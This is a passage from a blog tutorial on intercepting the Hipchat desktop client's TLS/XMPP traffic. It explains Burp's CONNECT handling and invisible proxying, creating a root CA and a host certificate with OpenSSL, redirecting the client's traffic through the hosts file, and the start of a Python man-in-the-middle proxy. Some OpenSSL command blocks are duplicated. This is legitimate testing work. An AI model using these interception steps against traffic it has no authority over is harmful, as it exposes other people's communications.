&lt;p&gt;&lt;del&gt;Click for full-size image.&lt;/del&gt; Doesn&amp;rsquo;t apply anymore as I don&amp;rsquo;t have imgpopup in Hugo.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat3/03-GET-blog_info-in-Wireshark.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;In other words:&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat3/04-GET-blog_info-Sequence-Diagram.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;In other other words:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Hipchat creates a TCP connection to Burp.&lt;/li&gt;
&lt;li&gt;Hipchat sends the GET request to Burp.&lt;/li&gt;
&lt;li&gt;Burp creates a TCP connection to Server.&lt;/li&gt;
&lt;li&gt;Burp sends the GET request to Server.&lt;/li&gt;
&lt;li&gt;Server send the web page to Burp.&lt;/li&gt;
&lt;li&gt;Burp closes the TCP connection to Server.&lt;/li&gt;
&lt;li&gt;Burp sends the web page to Hipchat.&lt;/li&gt;
&lt;li&gt;Burp closes the TCP connection to Hipchat.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Some notes:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;After the TCP handshake, each request will have an ACK.&lt;/li&gt;
&lt;li&gt;Hipchat is initiating to close the TCP connection in both cases.&lt;/li&gt;
&lt;li&gt;Both connection are closed correctly (FIN) instead of RST. FIN means “I am done with the connection but will listen to what you are saying until you confirm it with another FIN” while RST forcibly closes the connection.&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;2-2-get-https-s3-amazonaws-com-uploads-hipchat-com-freddie-png:6f44788618f3174bd28bf25248bb8608&#34;&gt;2.2 GET &lt;a href=&#34;https://s3.amazonaws.com/uploads.hipchat.com/…/freddie.png&#34; target=&#34;_blank&#34;&gt;https://s3.amazonaws.com/uploads.hipchat.com/…/freddie.png&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;This one is different because it is over TLS.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat3/05-GET-Freddie-in-Wireshark.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;I am not going to mark the Wireshark screenshot this time. Because the sequence diagram explains everything:&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat3/06-GET-Freddie-Sequence-Diagram.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;This is very similar to the previous HTTP request. One difference is that Burp will generate its own certificate (signed by its own root Certificate Authority or root CA) for &lt;code&gt;s3.amazonaws.com&lt;/code&gt; and present it to Hipchat. Hipchat then checks this certificate for validity and if it is signed by a valid root CA. If you have Burp, you have already added Burp’s CA to Windows’ certificate store (right?) so this fake certificate will be valid.&lt;/p&gt;

&lt;h5 id=&#34;2-2-1-what-is-this-connect:6f44788618f3174bd28bf25248bb8608&#34;&gt;2.2.1 What is this CONNECT?&lt;/h5&gt;

&lt;p&gt;We did not see it last time. This is Hipchat’s way of telling the proxy (Burp) about the destination before starting the TLS handshake. In a normal connection everything after the TLS handshake is encrypted (doh) so the proxy does not see anything inside. And lower level data in the packet (e.g. destination IP) do not have this information either because packets are headed for Burp’s IP which is 127.0.0.1 (or IP address of Burp). Before a TLS connection is established Hipchat will do send the &lt;code&gt;CONNECT&lt;/code&gt; request to tell the proxy (in this case Burp) of the destination where the packets should be forwarded.&lt;/p&gt;

&lt;p&gt;Remember that while Burp is a Man-in-the-Middle (MitM) proxy and can decrypt TLS connections, most proxies (especially in corporate environments) are just forwarding proxies so they need this &lt;code&gt;CONNECT&lt;/code&gt; to work properly. For example if we did not have this &lt;code&gt;CONNECT&lt;/code&gt; request, our SSL pass through in part two would have not worked as Burp was not decrypting traffic for that endpoint. Burp is just forwarding whatever it receives to the destination and does not see the content of requests.&lt;/p&gt;

&lt;p&gt;Burp is sending this request because it is proxy-aware as we used its option to designate burp as proxy. For non-proxy-aware clients we have to use another one of Burp’s capabilities.&lt;/p&gt;

&lt;h5 id=&#34;2-2-2-burp-s-invisible-proxying:6f44788618f3174bd28bf25248bb8608&#34;&gt;2.2.2 Burp’s Invisible Proxying&lt;/h5&gt;

&lt;p&gt;In each blog post we are learning a new Burp thing. It seems like we’re becoming quite the Burp expert neh? ;)&lt;/p&gt;

&lt;p&gt;If the client is non-proxy-aware and does not send the &lt;code&gt;CONNECT&lt;/code&gt; before the TLS handshake (because it doesn’t know it is connected to a proxy), Burp needs to know where to send the requests. As Burp is a MitM proxy and is terminating TLS, it can look inside the payloads and determine the destination from the &lt;code&gt;host&lt;/code&gt; header. This is called Burp’s &lt;code&gt;invisible proxying&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;It can be enabled at &lt;code&gt;Proxy &amp;gt; Options&lt;/code&gt;. Select the proxy listener, click &lt;code&gt;edit&lt;/code&gt; and under &lt;code&gt;Request Handling&lt;/code&gt; select &lt;code&gt;Support invisible proxying (enable only if needed)&lt;/code&gt;.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat3/07-Burp-invisible-proxy-mode.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;h3 id=&#34;3-how-does-hipchat-work:6f44788618f3174bd28bf25248bb8608&#34;&gt;3. How does Hipchat Work?&lt;/h3&gt;

&lt;p&gt;Great, now we (hopefully) have a pretty good idea how MItM proxies work. But before developing our own we must observe Hipchat in its natural habitat to cater to its needs. Let&amp;rsquo;s remove the proxy settings from Hipchat, close it and run it again.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat3/08-Hipchat-Normal-Traffic.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;In other words. &lt;del&gt;Click for full-size diagram&lt;/del&gt; (I have redacted the name of the Hipchat server because I am lazy):&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat3/09-Hipchat-in-Action.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;In other other words:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;TCP handshake.&lt;/li&gt;
&lt;li&gt;Client starts the XMPP handshake.&lt;/li&gt;
&lt;li&gt;Server responds and indicates that TLS is required.&lt;/li&gt;
&lt;li&gt;Client sends STARTTLS indicating that it is ready to well, start TLS.&lt;/li&gt;
&lt;li&gt;Server responds with PROCEED.&lt;/li&gt;
&lt;li&gt;TLS handshake.&lt;/li&gt;
&lt;li&gt;TLS traffic.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If you remember part two where we proxied the traffic through Burp, it would butcher the first XMPP handshake request and then the server would reset the connection. Now that we have seen how Hipchat works we can create our own proxy.&lt;/p&gt;

&lt;h3 id=&#34;4-proxy-design:6f44788618f3174bd28bf25248bb8608&#34;&gt;4. Proxy Design&lt;/h3&gt;

&lt;p&gt;Let’s reiterate what the proxy needs to do:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Create a TCP socket and start listening on port &lt;code&gt;5222&lt;/code&gt; (Hipchat port). Let’s call it the client socket.&lt;/li&gt;
&lt;li&gt;When a connection is made, read the first part of XMPP handshake from client.&lt;/li&gt;
&lt;li&gt;Create a TCP connection to hipchatserver.com. Let’s call it the server socket.&lt;/li&gt;
&lt;li&gt;Send the message relayed from client to server.&lt;/li&gt;
&lt;li&gt;Read the server’s response (2nd part of XMPP handshake) from server socket and relay it back to client. This will contain the &lt;code&gt;STARTTLS&lt;/code&gt; requirement.&lt;/li&gt;
&lt;li&gt;Read the &lt;code&gt;STARTTLS&lt;/code&gt; message from client (indicating) that it is ready to start doing TLS and send it to server.&lt;/li&gt;
&lt;li&gt;Receive &lt;code&gt;PROCEED&lt;/code&gt; from server and send it to client.&lt;/li&gt;
&lt;li&gt;Convert both client and server connections to TLS.&lt;/li&gt;
&lt;li&gt;Read from client socket, decrypt the message and send it to server via the (now TLS) server socket.&lt;/li&gt;
&lt;li&gt;Read from server socket, decrypt the message and send it to client via client socket.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Seems easy enough right? To be honest it is (you were expecting me to say wrong didn’t you? :D).&lt;/p&gt;

&lt;h4 id=&#34;4-1-tls-certificate-blues:6f44788618f3174bd28bf25248bb8608&#34;&gt;4.1 TLS Certificate Blues&lt;/h4&gt;

&lt;p&gt;We need to create a TLS certificate for &lt;code&gt;hipchatserver.com&lt;/code&gt; to present to Hipchat when we upgrade the connection to TLS. Here’s a catch, you can create a self-signed certificate which means that it is signed by itself. Self-signed certificate is also used in a different situation in the field which means an organization is signing their own certificates. In both cases, it means that the certificate is not valid. Hipchat will freak out if you give it a self-signed certificate signed by itself.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat3/10-self-signed-cert-error-in-hipchat-client.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Even if you select “I know what I’m doing” and try to proceed, Hipchat will break the connection. So we need to generate our own root CA and sign our certificate with it and finally add this root CA to the list of trusted certificate authorities in Windows certificate store (just like we did with Burp’s CA).&lt;/p&gt;

&lt;h4 id=&#34;4-2-generating-tls-certificates:6f44788618f3174bd28bf25248bb8608&#34;&gt;4.2 Generating TLS Certificates&lt;/h4&gt;

&lt;p&gt;I generated my certificates using &lt;code&gt;OpenSSL&lt;/code&gt; in &lt;code&gt;Cygwin&lt;/code&gt;. First we need to create a pair of RSA keys and then use them to create a root CA.&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;creating our root CA&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;# Generate a 2048 bit RSA key pair&lt;/span&gt;
openssl genrsa -out rootCA.key 2048

&lt;span style=&#34;color: #586E75&#34;&gt;# Create a rootCA (valid for a year)&lt;/span&gt;
openssl req -x509 -new -nodes -key rootCA.key -days &lt;span style=&#34;color: #2AA198&#34;&gt;365&lt;/span&gt; -out rootCA.crt

&lt;span style=&#34;color: #586E75&#34;&gt;# Generate a 2048 bit RSA key pair&lt;/span&gt;
openssl genrsa -out rootCA.key 2048
 
&lt;span style=&#34;color: #586E75&#34;&gt;# Create a rootCA (valid for a year)&lt;/span&gt;
openssl req -x509 -new -nodes -key rootCA.key -days &lt;span style=&#34;color: #2AA198&#34;&gt;365&lt;/span&gt; -out rootCA.crt
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;And you will see something similar to this:&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;creating our root CA in Cygwin&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ openssl genrsa -out rootCA.key 2048
Generating RSA private key, &lt;span style=&#34;color: #2AA198&#34;&gt;2048&lt;/span&gt; bit long modulus
.............................................+++
......+++
e is &lt;span style=&#34;color: #2AA198&#34;&gt;65537&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x10001&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;

$ openssl req -x509 -new -nodes -key rootCA.key -days &lt;span style=&#34;color: #2AA198&#34;&gt;365&lt;/span&gt; -out rootCA.crt
$ openssl genrsa -out rootCA.key 2048
Generating RSA private key, &lt;span style=&#34;color: #2AA198&#34;&gt;2048&lt;/span&gt; bit long modulus
.............................................+++
......+++
e is &lt;span style=&#34;color: #2AA198&#34;&gt;65537&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x10001&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;
 
$ openssl req -x509 -new -nodes -key rootCA.key -days &lt;span style=&#34;color: #2AA198&#34;&gt;365&lt;/span&gt; -out rootCA.crt
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, the field will be left blank.
-----
Country Name &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt; letter code&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;AU&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;:US
State or Province Name &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;full name&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;Some-State&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;:
Locality Name &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;eg, city&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; :
Organization Name &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;eg, company&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;Internet Widgits Pty Ltd&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;:
Organizational Unit Name &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;eg, section&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;[]&lt;/span&gt;:
Common Name &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;e.g. server FQDN or YOUR name&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;[]&lt;/span&gt;:
Email Address &lt;span style=&#34;color: #719e07&#34;&gt;[]&lt;/span&gt;:
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;Now we need to create our certificate for &lt;code&gt;hipchatserver.com&lt;/code&gt; and then sign it.&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;creating the certificate for Hipchat server&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8
9&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;# First we need to create a key pair for the new certificate&lt;/span&gt;
openssl genrsa -out host.key 2048

&lt;span style=&#34;color: #586E75&#34;&gt;# Then we will use the key pair to generate a Certificate Signing Request or CSR&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# This is what you send to valid certificate authorities to ask them to create &amp;amp; sign a valid certificate for you&lt;/span&gt;
openssl req -new -key host.key -out host.csr

&lt;span style=&#34;color: #586E75&#34;&gt;# Now we can create a valid certificate and sign it with our rootCA&lt;/span&gt;
openssl x509 -req -in host.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -out host.crt -days 365
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;





    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;creating the certificate for Hipchat server in Cygwin&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;# Key pair generation&lt;/span&gt;
$ openssl genrsa -out host.key 2048
Generating RSA private key, &lt;span style=&#34;color: #2AA198&#34;&gt;2048&lt;/span&gt; bit long modulus
.....................................................................................................................................................................................................................................................+++
.........+++
e is &lt;span style=&#34;color: #2AA198&#34;&gt;65537&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x10001&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;# CSR &lt;/span&gt;
$ openssl req -new -key host.key -out host.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, the field will be left blank.
-----
Country Name &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt; letter code&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;AU&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;:US
State or Province Name &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;full name&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;Some-State&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;:Virginia
Locality Name &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;eg, city&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;[]&lt;/span&gt;:
Organization Name &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;eg, company&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;Internet Widgits Pty Ltd&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;:
Organizational Unit Name &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;eg, section&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;[]&lt;/span&gt;:
Common Name &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;e.g. server FQDN or YOUR name&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;[]&lt;/span&gt;:hipchatserver.com
Email Address &lt;span style=&#34;color: #719e07&#34;&gt;[]&lt;/span&gt;:

Please enter the following &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;extra&amp;#39;&lt;/span&gt; attributes
to be sent with your certificate request
A challenge password &lt;span style=&#34;color: #719e07&#34;&gt;[]&lt;/span&gt;:
An optional company name &lt;span style=&#34;color: #719e07&#34;&gt;[]&lt;/span&gt;:

&lt;span style=&#34;color: #586E75&#34;&gt;# TLS certificate creation&lt;/span&gt;
$ openssl x509 -req -in host.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -out host.crt -days 365
Signature ok
&lt;span style=&#34;color: #268BD2&#34;&gt;subject&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;/C&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;US/ST&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;Virginia/O&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;Internet Widgits Pty Ltd/CN&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;hipchatserver.com
Getting CA Private Key

&lt;span style=&#34;color: #586E75&#34;&gt;# This is what we will finally have&lt;/span&gt;
$ ls
host.crt host.csr host.key rootCA.crt rootCA.key rootCA.srl
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;Notice that I entered &lt;code&gt;hipchatserver.com&lt;/code&gt; for the certificate’s Common Name (CN), this is handy in case the client is checking this field against the server. Obviously you should keep the key files secret.&lt;/p&gt;

&lt;p&gt;This can also be done on the fly in our proxy but I decided to do it outside to keep it simple. A proxy can discover the endpoint via the &lt;code&gt;CONNECT&lt;/code&gt; request and create a certificate for that domain. In a non-proxy aware situation where the &lt;code&gt;CONNECT&lt;/code&gt; is not sent, we either have to tell the proxy to create a proxy for a specific endpoint or just present a certificate with a random CN and hope for the best. In Burp we can specify the endpoint manually and/or tell Burp to create a certificate with a specific CN for each proxy listener.&lt;/p&gt;

&lt;h3 id=&#34;5-redirecting-traffic-from-non-proxy-aware-clients:6f44788618f3174bd28bf25248bb8608&#34;&gt;5. Redirecting Traffic from Non-Proxy-Aware Clients&lt;/h3&gt;

&lt;p&gt;This is another problem. Assuming we are listening on &lt;code&gt;127.0.0.1:5222&lt;/code&gt; how are we going to redirect Hipchat’s traffic to our proxy? We can use Hipchat’s proxy configuration to do this but let’s not use that because I want to talk about redirecting traffic for non-proxy-aware clients.&lt;/p&gt;

&lt;p&gt;We only need traffic to hipchatserver.com all traffic must be redirected to &lt;code&gt;127.0.0.1&lt;/code&gt; or &lt;code&gt;localhost&lt;/code&gt;. On Windows this can be done through the &lt;code&gt;hosts&lt;/code&gt; file. Open your favorite text editor as administrator and open it at the following location:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;%windir&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;\system32\drivers\etc\hosts&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;or&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;c:\windows\system32\drivers\etc\hosts&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Add the following line to the file and save:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;127.0.0.1 hipchatserver.com
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We could also do it with a kernel driver like &lt;code&gt;WinDivert&lt;/code&gt; like we did in &lt;code&gt;[redacted internal proxy tool]&lt;/code&gt;. Although the traffic is redirected, the port does not change so our proxy needs to listen on port &lt;code&gt;5222&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s remove proxy settings from Hipchat and we are good to go.&lt;/p&gt;

&lt;h3 id=&#34;6-hipproxy:6f44788618f3174bd28bf25248bb8608&#34;&gt;6. HipProxy&lt;/h3&gt;

&lt;p&gt;Now let’s look at our proxy code. Comments should give us enough info.&lt;/p&gt;

&lt;p&gt;Remember to copy &lt;code&gt;host.crt&lt;/code&gt; and &lt;code&gt;host.key&lt;/code&gt; into the directory where the Python code is (or modify their paths in the source code):&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;HipProxy-commented.py&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;# listen on 127.0.0.1:5222&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;PROXY_HOST&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;PROXY_PORT&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5222&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# send everything to hipchatserver.com:5222&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;REMOTE_HOST&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;10.11.1.25&amp;quot;&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;# hipchatserver.com&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;REMOTE_PORT&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5222&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# buffer size in bytes&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# we will need such a large buffer because server will send a lot of data after the connection is established&lt;/span&gt;
